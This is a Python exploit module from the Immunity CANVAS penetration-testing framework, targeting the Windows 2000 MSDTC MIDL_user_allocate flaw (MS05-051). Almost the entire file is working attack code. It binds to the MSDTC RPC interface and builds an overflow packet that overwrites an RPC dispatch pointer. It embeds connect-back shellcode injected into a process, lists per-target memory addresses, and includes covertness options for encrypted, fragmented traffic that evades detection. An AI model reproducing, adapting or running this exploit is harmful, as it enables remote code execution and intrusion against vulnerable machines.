#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
import socket
import time
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
import canvasengine
import libs.newsmb.libdcerpc as libdcerpc
from msrpcexploit import msrpcexploit

# GUI info
NAME="msdtc MIDL_user_allocate bug (MS05-051)"
DESCRIPTION="msdtc MIDL_user_allocate bug"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"] = "10/11/2005"
#DOCUMENTATION["MS"]="MS05-051"
DOCUMENTATION["Platforms Tested"] = "Windows Server 2000 SP4 ENG"
DOCUMENTATION["CVE Name"] = "CVE-2005-2119"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2119"
DOCUMENTATION['CVSS'] = 5.0
DOCUMENTATION["MSRC"] = "http://www.microsoft.com/technet/security/Bulletin/MS05-051.mspx"

VERSION="0.1"

PROPERTY = {}
#technically this is an Exploit but it's never going to be reliable
PROPERTY['TYPE'] = "DoS"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"]]
PROPERTY['VERSION'] = [ "2000" ]
PROPERTY['MSADV'] = "MS05-051"
GTK2_DIALOG="dialog.glade2"


CHANGELOG="""

"""
NOTES="""

IMPORTANT:
the following addresses are for msdtcprx.dll version 2000.2.3513.0

<noir> bp on 6dfd2a1b
<noir> add eax + 0x58 and replace it with 0x015a0058

and make sure 6dff91c4 is a pointer to NdrCall2 
RPC dispatch table tricks basically


msdtcprx.dll version 2000.2.3504.0

bp on 6df9007c


"""

runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

# info, RPCDispatch_ptr, retadd (off by one)
targets = {
    0 : ["Autoversioning N/A", 0,0],
    1 : ["Windows 2000 SP4 msdtcprx.dll!2000.2.3513.0 hardware", 0x6dff91c4, 0x3d0058],
    2 : ["Windows 2000 SP4 msdtcprx.dll!2000.2.3513.0 vmware", 0x6dff91c4, 0x015a0058]
    #2 : ["Windows 2000 SP4 msdtcprx.dll!2000.2.3513.0 vmware", 0x6dff61c4, 0x01560058]
    #4 : ["Windows 2000 SP1", 0, 0],
}

# define these according to targets
WIN2K=1


class theexploit(msrpcexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name              = NAME
        self.supportedNodeArgs = [["LocalNode","linuxNode","win32Node"]]
        self.covertness        = 0
        self.port              = 0
        self.host              = "192.168.0.6"
        self.localhost         = "192.168.0.2"
        self.localport         = 5555
        self.version           = 0
        self.badstring         = "\x00\\/.:$"
        self.myDCE             = None
        self.portscan          = None
        self.autoversion       = 0
        self.connectionList    = [] #none to start, fill this in with buildConnectionList()
        self.subesp            = 0
        self.name              = NAME
        self.UUID              = u"906b0ce0-c70b-1067-b317-00dd010662da"
        self.uuidversion       = u"1.0"
        self.postactions       = [("restart service",["MSDTC"])]
        self.listenerArgsDict["fromcreatethread"] = 1

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        #on windows 2003 we actually trigger a heap overflow, so we'll use this 
        #for all of the exploits to prevent the heap corruption from disturbing us
        host=self.callback.ip
        port=self.callback.port
        #if smallcode is zero, then use fromcreatethread if running from commandline.
        # defaults to LSASS.EXE and lsass.exe
        self.shellcode=self.createHeapSafeInjectIntoProcess(self.badstring,host,port,smallcode=0)
        return self.shellcode
 
    def buildConnectionList(self):
        """
        Specify endpoints for the attack
        """
        
        if self.connectionList!=[]:
            return self.connectionList 

        if self.port==0:
            self.searchifids()                
        else:
            #user specified
            self.connectionList += ["ncacn_ip_tcp:%s[%d]" % (self.host, self.port)]
        return self.connectionList
    
    def connect(self):
        # connect DCE pipe
        connectionList =  self.buildConnectionList()
        connected = False
        
        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
        
        for binding in connectionList:
            try:
                self.log('Trying %s' % binding)
                self.myDCE = libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                              frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                if not res:
                    raise libdcerpc.DCERPCException('no reason')
                connected = True
                break
            except libdcerpc.DCERPCException, msg:
                self.log('Could not connect: %s' % msg)

        if not connected:
            self.log('Could not connect to DCE service')
            return 0
        
        self.log("Connected, starting attack!")
        return 1

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.user=self.argsDict.get("user",self.user)
        self.password=self.argsDict.get("password",self.password)

        if self.connect():
            self.port=self.myDCE.dcerpc_connection.port
            self.log("Found ms_dtc port: %d"%self.port)
            self.testOS()
            return 1

        self.log("test failed")
        return 0
    
    def testOS(self):
        """Sets the version properly, if possible"""
        return 0
    
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.user=self.argsDict.get("user",self.user)
        self.password=self.argsDict.get("password",self.password)        
        
        self.setInfo("%s attacking %s:%d - (in progress)"% (self.name, self.host, self.port), showlog=True)
        try:
            if not self.connect():
                self.setInfo('%s attacking %s:%d (failed)' % (self.name, self.host, self.port), showlog=True)
                return 0
            self.setProgress(25)
            pkt = self.buildDcePacket()
            self.myDCE.call(7, pkt, response=True)
            self.setProgress(50)
            time.sleep(2)
            if not self.connect():
                self.setInfo('%s attacking %s:%d (failed)' % (self.name, self.host, self.port), showlog=True)
                return 0
            self.setProgress(75)
            pkt = self.buildDcePacket()
            self.myDCE.call(7, pkt, response=True)
        except self.error, msg:
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
            self.log("Failed reason: %s" % str(msg))
            return 0                       
        
        time.sleep(4)
        self.setProgress(100)
        
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name,self.host,self.port), showlog=True)
            self.log("%s done (succeeded!)"%self.name)
            return 1
            
        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), 
                     showlog=True)
        self.log("%s done (failed)"%self.name)
        return 0
            
            
    
    def buildDcePacket(self):
        """Build's our attack packet"""
        info, fptr, virtaddr = targets[self.version]
        pkt = ""
        data = ""            
        
        size = 0x400
        data = "\xcc"*(size*2)
        payload = "A"*12 + self.shellcode
        
        data = payload + (0x800 - len(payload)) * "C"
        
        self.log("len of payload %.8x data %.x" % (len(payload), len(data)))
        
        pkt += struct.pack("<L", 0x8a880000L)
        pkt += struct.pack("<L", 0x10)
        pkt += struct.pack("<L", 0x11)
        pkt += struct.pack("<L", 0x12)
        pkt += struct.pack("<L", 0x13)
        pkt += struct.pack("<L", 0x14)
        pkt += struct.pack("<L", 0x15)        
        #unicode
        pkt += struct.pack("<L", 2)
        pkt += struct.pack("<L", 0)
        pkt += struct.pack("<L", 2)
        pkt += struct.pack("<L", 0x41)
        #unicode
        pkt += struct.pack("<L", 2)
        pkt += struct.pack("<L", 0)
        pkt += struct.pack("<L", 2)
        pkt += struct.pack("<L", 0x42)
        #unicode
        pkt += struct.pack("<L", 0x1)
        pkt += struct.pack("<L", 0)
        pkt += struct.pack("<L", 0x1)
        pkt += struct.pack("<L", 0x0)
        
        #ovf vector
        #let assume VirtualAlloc returns 0x015a0000
        #0x6dff91c4 --> opcode:7 
        
        #
        offset = ((fptr - virtaddr - 4)/2)

        #hardware
        #offset = ((0x6dff91c4 - 0x3d0058 - 4)/2)
        #self.log("offset calculated: %.8x" % offset)
        
        pkt += struct.pack("<L", offset)
        pkt += struct.pack("<L", 0x0)
        pkt += struct.pack("<L", size+1)
        pkt += data
        pkt += struct.pack("<L", 0)
        
        #unicode        
        pkt += struct.pack("<L", 8)
        pkt += struct.pack("<L", 0)
        pkt += struct.pack("<L", 8)
        pkt += "\xcc\xcc\xcc\xcc"
        
        #ptr
        pkt += struct.pack("<L", 0x12fe08)
        pkt += "\xcc"*4
        
        pkt += struct.pack("<L", 0x21)
        pkt += struct.pack("<L", 0x21)
        pkt += struct.pack("<L", 0x22)
        pkt += struct.pack("<L", 0x23)
        pkt += struct.pack("<L", 0x24)
        pkt += struct.pack("<L", 0)        
        pkt += struct.pack("<L", 0)        
        
        return pkt

    def usage(self):
            print "Usage: %s -v version -t host -l localIP -d localPort (connectback) [-T: testmode]"% sys.argv[0]
            print "NOTE!!!!! - if using commandlineInterface.py, you must use -i fromcreatethread . "
            
            i = 0
            print "Available versions:"
            for listline in targets.values():
                print "\t%d : %s"% (i, listline[0])
                i = i + 1

    
if __name__== '__main__':
    app = theexploit()
    app.port = 0
    ret=standard_callback_commandline(app)


    
